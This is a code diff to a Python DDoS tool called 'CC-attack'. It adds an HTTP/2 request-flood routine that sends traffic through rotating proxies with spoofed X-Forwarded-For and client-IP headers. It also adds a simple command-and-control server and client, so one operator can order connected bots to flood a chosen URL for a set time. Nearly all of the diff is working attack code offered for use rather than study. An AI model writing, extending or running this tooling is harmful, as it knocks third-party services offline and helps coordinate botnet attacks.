@@ -14,6 +14,8 @@ import socket
 import os
 import time
 import requests
+import h2.connection
+import h2.events
 
 try:
 	import win32file# I guess linux won't have this library, doesn't it?
@@ -34,6 +36,7 @@ except:
 class global_vars :
 
 	def __init__(self) -> None:
+		self.http2 = False
 		self.method = "get"
 		self.target_url = ""
 		self.proxy_type = 5
@@ -172,12 +175,16 @@ def generate_random_string(pattern):
 def build_threads(vars,events):
 	# Create a thread to run the HTTP flood function
 	for _ in range(vars.threads_num):
-		threading.Thread(target=CC_ATTACK, args=(vars,events,)).start()
+		if vars.http2:
+			threading.Thread(target=CC_ATTACK2, args=(vars,events,)).start()
+		else:
+			threading.Thread(target=CC_ATTACK, args=(vars,events,)).start()
 
 def build_processes(vars,events):
 	if vars.process_num < 1:
 		print("Invaild Process numbers.(At least 1 process)")
 	for _ in range(vars.process_num):
+		#build_threads(vars,events)
 		multiprocessing.Process(target=build_threads, args=(vars,events,),daemon=True).start()
 
 def check_list(proxy_file):
@@ -237,6 +244,53 @@ def PreGenRequest(vars):
 
 	return request
 
+
+def PreGenRequest2(vars):
+	path_parts = vars.path.partition("?")
+	add = "&" if path_parts[1] else "?"
+	request = {
+		":scheme":"https",
+		":method" : vars.method.upper(),
+		":authority": vars.target,
+		":path": vars.path + "{url_arg}".format(url_arg=add+"{url_arg}" if vars.randurl else ""),
+		"user-agent": getuseragent(),
+	}
+	
+	if vars.cookies != "":
+		request["cookie"]=vars.cookies
+
+	accept_ln = random.choice(vars.acceptall).split("\r\n")
+	for accept in accept_ln:
+		try:
+			accept = accept.strip().split(":")
+			request[accept[0]]= accept[1]
+		except:
+			pass
+
+	request["connection"]="keep-alive"
+	request["cache-control"]="no-cache"
+	request["sec-fetch-dest"]="document"
+	request["sec-fetch-mode"]="navigate"
+	request["sec-fetch-site"]="none"
+	request["sec-fetch-user"]="?1"
+
+	fakeip = GenFakeIp()
+	request["via"]=fakeip
+	request["client"]=fakeip
+	request["client-ip"]=fakeip
+	request["x-forwarded-for"]=fakeip
+	request["x-forwarded-proto"]="http"
+
+	if vars.method != "post":
+		request["referer"]=random.choice(vars.referers)+vars.target
+	else:
+		request["referer"]=vars.protocol+"://"+vars.target
+		request["content-type"]="text/html; charset=utf-8"
+		request["content-length"]="{payload_len}"
+		#request += "{payload}"
+
+	return request
+
 def PrintHelp():
 	print('''
 ┌─────────────┬───── CC-attack help list  ───────────────────┐
@@ -255,7 +309,8 @@ def PrintHelp():
 │   -rand     │ enable random url/post data                  │
 │   -down     │ download proxies                             │
 │   -check    │ check proxies                                │
-│   -old      | enable old interface                         │
+│   -old      │ enable old interface                         │
+│   -h2       │ enable http2 protocol                        │ 
 └─────────────┴──────────────────────────────────────────────┘''')
 
 #################################
@@ -488,6 +543,78 @@ def CC_ATTACK(vars,event):
 			# Ignore any errors and keep sending requests
 			pass
 
+#http2
+def CC_ATTACK2(vars,event):
+	# Split the proxy string into host and port
+	proxy = random.choice(vars.proxies_list).strip().split(":")
+
+	ctx = ssl.create_default_context()
+	ctx.set_alpn_protocols(['h2'])
+	ctx.check_hostname = False
+	ctx.verify_mode = ssl.CERT_NONE
+
+	# Generate the request
+	pre_request= PreGenRequest2(vars)
+	requests = pre_request
+
+	# Wait signal
+	event.wait()
+
+	# Keep sending requests until interrupted
+	payload = vars.payload
+	if payload == "":
+		payload = RandomString()
+	while True:
+		try:
+			# Create a socket and set the proxy and timeout
+			s = socks.socksocket()
+			s.set_proxy(vars.proxytype_mapping[vars.proxy_type], str(proxy[0]), int(proxy[1]))
+			s.settimeout(vars.timeout)
+			# Connect to the target
+			s.connect((vars.target, vars.port))
+			if vars.protocol == "https":
+				s = ctx.wrap_socket(s)
+
+			c = h2.connection.H2Connection()
+			c.initiate_connection()
+			s.sendall(c.data_to_send())
+			# keep sending til error
+			while 1:
+				try:
+					if vars.randurl:
+						requests[":path"] = pre_request[":path"].format(url_arg=RandomString())
+					if vars.method == "post":
+						if vars.payload != "":
+							requests["content-length"] = pre_request["content-length"].format(payload_len=len(vars.payload))
+						else:				
+							requests["content-length"] = pre_request["content-length"].format(payload_len=len(str(payload)))
+					request = list(requests.items())
+					id = c.get_next_available_stream_id()
+					c.send_headers(id,headers=request,end_stream=False)
+					s.sendall(c.data_to_send())
+					s.settimeout(2)
+					if vars.method == "post":
+						c.send_data(id,payload,end_stream=False)
+						s.sendall(c.data_to_send())
+				except:
+					break
+			# Flooding no need to close socket :)
+			#c.close_connection()
+			#s.sendall(c.data_to_send())
+			#s.close()
+
+			# Close the socket (maybe not close will get better result?)
+			# Not closing the socket immediately
+			# because usually the data are not totally sent to target yet
+			#s.shutdown(2)
+			#s.close()
+		except:
+			# Generate again, same as the initial action
+			proxy = random.choice(vars.proxies_list).strip().split(":")
+			pre_request= PreGenRequest2(vars)
+			# Ignore any errors and keep sending requests
+			pass
+
 #################################
 #      Process Input stuff      #     
 #################################
@@ -631,13 +758,19 @@ def oldcli(vars):
 def main():
 	#Initial those "global" varibles
 	vars = global_vars()
-
 	help = False
 	download = False
 	check_proxies = False
 	durations = 60
 	proxy_file = "proxy.txt"
 	for n,args in enumerate(sys.argv):
+		if args == "-server":
+			commander_interface(sys.argv[n+1])
+			print("hi")
+			return
+		if args == "-client":
+			client(sys.argv[n+1])
+			return
 		if args == "-old":
 			oldcli(vars)
 			return
@@ -694,12 +827,14 @@ def main():
 				return
 		if args == "-timeout":
 			try:
-				vars.timeout = float(sys.argv[n+1])
+				vars.timeout = int(sys.argv[n+1])
 			except:
 				print("> Timeout should be positive number")
 				return
+		if args == "-h2":
+			vars.http2 = True
 
-	if help or ( vars.target == "" and (download == False or check_proxies == False)):
+	if help or ( vars.target == "" and (download == False and check_proxies == False)):
 		PrintHelp()
 		return
 
@@ -745,6 +880,123 @@ def main():
 	event.set()
 	print("> Flooding...")
 	time.sleep(durations)
+
+
+'''
+End of CC-Attack functions
+
+Now is for communications
+'''
+conn_list = []
+def server(bind_addr,lock):
+	global conn_list
+	try:
+		s = socket.socket()
+		s.bind(bind_addr)
+		threading.Thread(target=keepalive_pool,args=(lock,),daemon=True)
+		while True:
+			conn,connAddr = s.accept()
+			conn.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+			conn.settimeout(15)
+			conn_list[connAddr] = conn
+	except:
+		return
+
+def keepalive_pool(lock):
+	global conn_list
+	while 1:
+		time.sleep(15)
+		for conn in conn_list:
+			try:
+				conn.send('\0')
+			except:
+				conn_list.remove(conn)
+		
+	
+def printHelp():
+	print("              Command list               ")
+	print(".cc   | .cc url methods threads durations")
+	print(".help | show this message                ")
+
+def commander_interface(bind_addr):
+	global conn_list
+	lock = threading.Lock()
+	threading.Thread(target=server,args=(bind_addr,lock,),daemon=True).start()
+	printHelp()
+	while True:
+		cmd = str(input(">"))
+		if cmd == ".help":
+			printHelp()
+		elif ".cc" in cmd:
+			cmd = cmd.strip().split()
+			if cmd[0] == ".cc":
+				if "http" in cmd[1] and "://" in cmd[1]:# it should be a normal url
+					if cmd[2].lower() in ["get","post","head"]:
+						try:
+							threads = int(cmd[3])
+							durations = int(cmd[4])
+							
+							for conn in conn_list:
+								threading.Thread(target=sendCmd2conn,args=(cmd,conn,lock,)).start()
+						except:
+							print("> wrong command")
+
+def sendCmd2conn(cmd,conn,lock):
+	try:
+		conn.send(cmd)
+	except:
+		lock.acquire()
+		conn_list.remove(conn)
+		lock.release()
+
+######################################
+# .cc url methods threads durations #
+#####################################
+
+def parse_cmd(cmd):
+	vars = global_vars()
+	if cmd[0] == ".cc":
+		if "http" in cmd[1] and "://" in cmd[1]:# it should be a normal url
+			if cmd[2].lower() in ["get","post","head"]:
+				try:
+					threads = int(cmd[3])
+					durations = int(cmd[4])
+					vars.method = cmd[2].lower()
+					# if no error it means cmd[3] is integer
+					proxy_file = "proxy.txt"
+					vars.proxies_list = open(proxy_file).readlines()
+					ParseUrl(cmd[1],vars)# Parse url
+
+					event = threading.Event()
+					th_list = []
+					for _ in range(threads):
+						th = threading.Thread(target=CC_ATTACK,args=(vars,event),daemon=True)
+						th.start()
+						th_list.append(th)
+					event.set()
+					event.clear()
+					time.sleep(durations)
+					return
+				except:
+					pass
+
+def client(server_addr):
+	try:
+		s = socket.socket()
+		s.connect(server_addr)
+		s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+		s.settimeout(15)
+		while 1:
+			try:
+				raw_cmd = s.recv(1024) # It should be enough
+				cmd = str(raw_cmd).strip().split()
+				multiprocessing.Process(target=parse_cmd,args=(cmd,)).start()
+			except EOFError:
+				return
+			except:
+				pass
+	except:
+		return
 
 if __name__ == '__main__':
 	PrintLogo()
